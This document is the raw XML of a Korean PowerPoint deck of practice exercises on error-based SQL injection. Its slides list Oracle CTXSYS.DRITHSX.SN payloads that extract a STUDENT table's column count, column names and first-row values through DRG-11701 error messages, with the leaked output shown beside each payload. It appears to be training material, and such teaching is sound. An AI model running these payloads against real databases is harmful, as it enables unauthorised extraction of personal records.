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C0ADF-E1C7-7BDE-2450-A30FF1881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5EB98A-9978-5217-232A-77C2B696C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6DEAF4-F6B3-0F78-709C-3E7EE865A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F6A1C3-EDBC-97B6-E90F-DD4567B3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1C30B-EEBA-5F35-3B03-7E490F71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219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A6DEC-F713-6200-15F1-43169F57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827F9-29E0-D8FD-3A95-32E3D064B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FEDEC1-526B-CB37-A999-6C409B2D8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F94931-8E25-E058-B107-A784F34F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A5242A-62F3-B934-DD0E-3C1F91D6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2115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5E84B-41E5-12EB-8054-CE0C83873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91A335-4123-B5E0-2754-EAC8EFED1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21586C-7AEA-3E6E-0BA8-381DD0EA2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8CE3B-CF51-618C-B63B-52CD01E6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B3342C-C733-B056-D72F-D9E96E95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2493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54CEF-64C0-E62D-14BA-B23792745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A8EF1-EE84-3256-06EC-F6DFA0B5A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416379-9AED-9137-8302-BD8505D3A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8A98FF-8D35-123D-64B7-5448EE117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AE3AFF-6FAC-D6EC-1AAD-1938B873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471050-8445-0E57-F1B1-AC167CC4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421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C750E-289B-EC0F-5A00-23004D452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18F3A0-498D-CEB2-42B5-F92D6BAAF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B03271-AF41-A5F6-F0BE-13B17E78C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C4056B-242B-86B9-3195-1034AA219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698810-0CA2-E565-AA00-968185D53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6FA830-4844-8287-F09B-BA4A5CD90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740B6C-418C-0A00-BE1C-831F13D12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6FB1030-7909-21B5-E19E-68F182FD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720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DD000-C8A1-09B5-5ABB-5A22F7F0A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EB559C-69F9-C0BA-4CFA-CFC5EFA0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F534D6-9C3D-2F5E-D33F-5586DA649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17A4BA-0FB0-D690-CF40-08D77996D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585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F644D0-1128-690E-7D54-ADC464BFC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05D147-4D07-FF17-59EE-3C7E97CA9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F9E9E1-A45D-4564-183A-444095FC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3831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6713F-84D0-BBA0-B42C-B93A63C0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A79477-C3E2-1EA6-3FAE-87B283287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4F971D-81E7-C76D-1226-97A18561A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38CE9A-38FF-EF3B-C97B-97514B2F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3AE1C9-12B0-8B2C-D6AA-831F5D2A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98631E-0874-5BDA-CF14-D982D1A57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8820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21E6A-2663-A1FD-2A8A-68932630B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B0A4F57-C547-C495-EE1B-F3988C360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ACD98E-905A-F418-6730-84CE84CD0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3E3514-8D7C-3127-BEDC-147443E4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86946D-FDFA-AFED-8D0E-DD7032CD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0D924C-F83F-0869-0E12-F9709017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883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FF2CF-6D32-268E-BCED-AD0920BA5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894FFC-56EE-10BC-18D1-DE50DD842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3F0337-E9C1-B77E-F213-1EEEF5C1F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1BD276-5422-B6ED-4020-FDFA3CE9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79705E-4F9D-2932-BFFE-716B9F1F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8854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ABF8ED-26A3-0FB1-760C-A95913A3B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F3A7B4-E75C-A71B-20DE-34BFFDADE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E6061F-A27D-BB95-7E29-4A9539FED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A64F9E-2A93-1E5A-8E40-0A1E63414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943CC7-07AB-6F82-F55C-68EBE337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162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08DC39-D86D-F56B-A2AC-4CE8BEFF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1CAEA1-22AA-1032-DC46-7443A99F7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30832D-4982-A2FD-0177-B51F21688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949B1-E403-2E4C-926B-1AF418B1863B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C56081-E0C7-66AC-8DE0-599ACD4D9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C8445F-A41B-A78A-1C54-D5557CDB3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C13E9-6029-0F40-9202-38AA72B3A3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8932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9B9C63-8893-4BA4-7200-50134296B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591"/>
            <a:ext cx="9144000" cy="2387600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>Error Based Injection</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ko-KR" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>연습문제</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="351583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296DB-1A89-11DC-C2C8-E3C0E274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- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>컬럼수</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="2000" dirty="0"/>
              <a:t> 확인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count</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>(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)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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0" err="1"/>
              <a:t>user_tab_columns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table_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>='STUDENT'))=1 --</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ko-KR" altLang="en-US" sz="20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0C442B5-D801-8081-842B-E4898BF0F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7244"/>
            <a:ext cx="10515600" cy="378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2FFFE-D26F-B21A-075E-69826D4C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0C018-AFCE-FA7E-9225-4EAC416D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- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2200" dirty="0"/>
              <a:t>DRG-11701: STDNO 키워드 사전이 존재하지 않습니다 - 첫번째 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2200" dirty="0" err="1"/>
              <a:t>컬럼명</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2200" dirty="0"/>
              <a:t> 탈취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, ROWNUM AS RNUM FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0" err="1"/>
              <a:t>user_tab_columns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table_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>='STUDENT')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RNUM=1))=1 --</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ko-KR" altLang="en-US" sz="2000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CD4F80C-2BBB-5AA5-2C87-7B9371760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5954"/>
            <a:ext cx="10515600" cy="37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93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7EF5-20CC-2A2B-EFEF-B606877E0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C82EB-EFD4-0C1F-6CC0-CF7E59A2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- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>DRG-11701: STDNAME 키워드 사전이 존재하지 않습니다 - 두번째 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0" err="1"/>
              <a:t>컬럼명</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t> 탈취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, ROWNUM AS RNUM FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0" err="1"/>
              <a:t>user_tab_columns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table_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>='STUDENT')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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>))=1 --</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ko-KR" altLang="en-US" sz="20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54CCBB8-2531-0DAB-FDBF-2BFFA2AE0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5800"/>
            <a:ext cx="10515600" cy="37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34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44341-D52E-B19D-FC40-5D76EF0F1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0614A-EAED-1F8B-07F6-90B3D1A6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- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>DRG-11701: STDYEAR 키워드 사전이 존재하지 않습니다 - 세번째 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0" err="1"/>
              <a:t>컬럼명</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t> 탈취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, ROWNUM AS RNUM FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0" err="1"/>
              <a:t>user_tab_columns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table_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>='STUDENT')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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>))=1 --</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ko-KR" altLang="en-US" sz="20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5EE09E4-979C-9E38-4BCD-A54E9530E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5600"/>
            <a:ext cx="10515600" cy="371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0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3DC4A-8CC5-B6F1-B2E7-29851AC8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50F66-E54E-6325-CA25-60E1AA519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ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>DRG-11701: STDADDRESS 키워드 사전이 존재하지 않습니다 - 네번째 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0" err="1"/>
              <a:t>컬럼명</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t> 탈취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, ROWNUM AS RNUM FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0" err="1"/>
              <a:t>user_tab_columns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table_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>='STUDENT')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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>))=1 --</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ko-KR" altLang="en-US" sz="2000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1D7EEB8-6680-D19A-5381-2F9B48F22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51327"/>
            <a:ext cx="10515600" cy="369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2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3B8B-9548-B5D8-B972-02B3EDD5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1C104-A883-DD30-11AD-7EEAA1EDC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ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>DRG-11701: STDBIRTH 키워드 사전이 존재하지 않습니다 - 다섯번째 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0" err="1"/>
              <a:t>컬럼명</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t> 탈취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, ROWNUM AS RNUM FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0" err="1"/>
              <a:t>user_tab_columns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table_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>='STUDENT')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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>5</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>))=1 --</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ko-KR" altLang="en-US" sz="20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8578321-3A60-771A-3BBA-B2275B71B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28653"/>
            <a:ext cx="10515600" cy="374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37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F0EE4-AFDD-FC08-4758-E2E3F435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B8555-C321-4A6F-F646-11A3BB4A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ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>DRG-11701: DPTNO 키워드 사전이 존재하지 않습니다 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0" err="1"/>
              <a:t>여섯번째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컬럼명</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t> 탈취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column_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>, ROWNUM AS RNUM FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0" err="1"/>
              <a:t>user_tab_columns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table_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>='STUDENT')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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>6</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>))=1 --</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ko-KR" altLang="en-US" sz="2000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CAF5CAE-58CE-70A9-D20F-73B6E4300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7445"/>
            <a:ext cx="10515600" cy="372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87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267B-1733-CE76-368B-28713DF9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0810B-ED25-9CB2-427E-5D244B8B5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ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>데이터 수 확인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count</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>(*)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STUDENT))=1 --</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ko-KR" altLang="en-US" sz="20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B236709-481A-D5CE-18F7-8B5CCA9AC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54098"/>
            <a:ext cx="10515600" cy="369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79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9C670-F66B-D67B-D1B1-589A4F3F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4AED92-0D87-F0B3-5247-CEDDC21B2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ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>DRG-11701: 2023001 키워드 사전이 존재하지 않습니다 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0" err="1"/>
              <a:t>STDNO의</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t> 첫번째 데이터 탈취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STDNO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STDNO, ROWNUM AS RNUM FROM STUDENT)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RNUM=1))=1 --</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ko-KR" altLang="en-US" sz="2000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5124C12-7F43-9E9A-6788-A9E0B71BF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20204"/>
            <a:ext cx="10515600" cy="376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07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9DAD-E72C-02FF-E499-41BAE442F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5529E-EAE1-9F72-2306-81CE7647C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ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>DRG-11701: 홍길동 키워드 사전이 존재하지 않습니다 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0" err="1"/>
              <a:t>STDNAME의</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t> 첫번째 데이터 탈취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STDNAME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STDNAME, ROWNUM AS RNUM FROM STUDENT)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RNUM=1))=1 --</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ko-KR" altLang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15" name="내용 개체 틀 14">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4435D7BC-3D0F-5CAC-E2EB-4BD19D6804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9344"/>
            <a:ext cx="10515600" cy="36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05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FCF91-1408-04B6-7B35-4CBF82CC5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37B31-77B6-83E7-185B-F6A37F08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ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>DRG-11701: 3 키워드 사전이 존재하지 않습니다 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0" err="1"/>
              <a:t>STDYEAR의</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t> 첫번째 데이터 탈취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STDYEAR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STDYEAR, ROWNUM AS RNUM FROM STUDENT)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RNUM=1))=1 --</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ko-KR" altLang="en-US" sz="20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05C33E4-7B3E-CF83-6E40-EA641E0E2C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7118"/>
            <a:ext cx="10515600" cy="372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395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E801C-4FA8-84D0-4FE5-B92110A45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EAA62-7120-3383-4AD2-60CBEFF48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ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>DRG-11701: 서울시 키워드 사전이 존재하지 않습니다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STDADDRESS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STDADDRESS, ROWNUM AS RNUM FROM STUDENT)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RNUM=1))=1 --</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ko-KR" altLang="en-US" sz="2000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489C86C-833C-CE5B-47F0-025B52D0B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8942"/>
            <a:ext cx="10515600" cy="372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30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09CEB-7BEE-F2DD-FF6A-4DD3F3FF3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CFC24-DA58-E63B-2CF2-768EE8B7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ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>DRG-11701: 99/01/01 키워드 사전이 존재하지 않습니다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STDBIRTH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STDBIRTH, ROWNUM AS RNUM FROM STUDENT)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RNUM=1))=1 --</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ko-KR" altLang="en-US" sz="20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36DB542C-BC3C-7B3A-03C8-D84EB66DA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19826"/>
            <a:ext cx="10515600" cy="376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80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099CB-E775-5D32-67FC-FC2387CA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336C0-03FA-6DDE-9C57-46C66DDAC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0829"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>DRG-11701: 002 키워드 사전이 존재하지 않습니다</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>' </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0" err="1"/>
              <a:t>or</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t> CTXSYS.DRITHSX.SN(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0" err="1"/>
              <a:t>user</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t>,(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DPTNO </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0" err="1"/>
              <a:t>from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select</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t> DPTNO, ROWNUM AS RNUM FROM STUDENT) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0" err="1"/>
              <a:t>where</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
              <a:t> RNUM=1))=1 --</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2000" dirty="0"/>
            </a:br>
            <a:endParaRPr kumimoji="1" lang="ko-KR" altLang="en-US" sz="2000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6ADD8DB-E0A9-97C8-BAC2-1DB3682A4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2580"/>
            <a:ext cx="10515600" cy="371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2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653</Words>
  <Application>Microsoft Macintosh PowerPoint</Application>
  <PresentationFormat>와이드스크린</PresentationFormat>
  <Paragraphs>15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Error Based Injection 연습문제</vt:lpstr>
      <vt:lpstr>- 컬럼수 확인 ' or CTXSYS.DRITHSX.SN(user,(select count(column_name) from user_tab_columns where table_name='STUDENT'))=1 --</vt:lpstr>
      <vt:lpstr>- DRG-11701: STDNO 키워드 사전이 존재하지 않습니다 - 첫번째 컬럼명 탈취 ' or CTXSYS.DRITHSX.SN(user,(select column_name from (select column_name, ROWNUM AS RNUM FROM user_tab_columns where table_name='STUDENT') where RNUM=1))=1 --</vt:lpstr>
      <vt:lpstr>- DRG-11701: STDNAME 키워드 사전이 존재하지 않습니다 - 두번째 컬럼명 탈취 ' or CTXSYS.DRITHSX.SN(user,(select column_name from (select column_name, ROWNUM AS RNUM FROM user_tab_columns where table_name='STUDENT') where RNUM=2))=1 --</vt:lpstr>
      <vt:lpstr>- DRG-11701: STDYEAR 키워드 사전이 존재하지 않습니다 - 세번째 컬럼명 탈취 ' or CTXSYS.DRITHSX.SN(user,(select column_name from (select column_name, ROWNUM AS RNUM FROM user_tab_columns where table_name='STUDENT') where RNUM=3))=1 --</vt:lpstr>
      <vt:lpstr>- DRG-11701: STDADDRESS 키워드 사전이 존재하지 않습니다 - 네번째 컬럼명 탈취 ' or CTXSYS.DRITHSX.SN(user,(select column_name from (select column_name, ROWNUM AS RNUM FROM user_tab_columns where table_name='STUDENT') where RNUM=4))=1 --</vt:lpstr>
      <vt:lpstr>- DRG-11701: STDBIRTH 키워드 사전이 존재하지 않습니다 - 다섯번째 컬럼명 탈취 ' or CTXSYS.DRITHSX.SN(user,(select column_name from (select column_name, ROWNUM AS RNUM FROM user_tab_columns where table_name='STUDENT') where RNUM=5))=1 --</vt:lpstr>
      <vt:lpstr>- DRG-11701: DPTNO 키워드 사전이 존재하지 않습니다 - 여섯번째 컬럼명 탈취 ' or CTXSYS.DRITHSX.SN(user,(select column_name from (select column_name, ROWNUM AS RNUM FROM user_tab_columns where table_name='STUDENT') where RNUM=6))=1 --</vt:lpstr>
      <vt:lpstr>- 데이터 수 확인 ' or CTXSYS.DRITHSX.SN(user,(select count(*) from STUDENT))=1 --</vt:lpstr>
      <vt:lpstr>DRG-11701: 2023001 키워드 사전이 존재하지 않습니다 - STDNO의 첫번째 데이터 탈취 ' or CTXSYS.DRITHSX.SN(user,(select STDNO from (select STDNO, ROWNUM AS RNUM FROM STUDENT) where RNUM=1))=1 --</vt:lpstr>
      <vt:lpstr>DRG-11701: 홍길동 키워드 사전이 존재하지 않습니다 - STDNAME의 첫번째 데이터 탈취 ' or CTXSYS.DRITHSX.SN(user,(select STDNAME from (select STDNAME, ROWNUM AS RNUM FROM STUDENT) where RNUM=1))=1 --</vt:lpstr>
      <vt:lpstr>DRG-11701: 3 키워드 사전이 존재하지 않습니다 - STDYEAR의 첫번째 데이터 탈취 ' or CTXSYS.DRITHSX.SN(user,(select STDYEAR from (select STDYEAR, ROWNUM AS RNUM FROM STUDENT) where RNUM=1))=1 --</vt:lpstr>
      <vt:lpstr>DRG-11701: 서울시 키워드 사전이 존재하지 않습니다 ' or CTXSYS.DRITHSX.SN(user,(select STDADDRESS from (select STDADDRESS, ROWNUM AS RNUM FROM STUDENT) where RNUM=1))=1 --</vt:lpstr>
      <vt:lpstr>DRG-11701: 99/01/01 키워드 사전이 존재하지 않습니다 ' or CTXSYS.DRITHSX.SN(user,(select STDBIRTH from (select STDBIRTH, ROWNUM AS RNUM FROM STUDENT) where RNUM=1))=1 --</vt:lpstr>
      <vt:lpstr>DRG-11701: 002 키워드 사전이 존재하지 않습니다 ' or CTXSYS.DRITHSX.SN(user,(select DPTNO from (select DPTNO, ROWNUM AS RNUM FROM STUDENT) where RNUM=1))=1 --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이다연</dc:creator>
  <cp:lastModifiedBy>이다연</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-09-03T01:49:50Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-03T02:19:19Z</dcterms:modified>
</cp:coreProperties>
</file>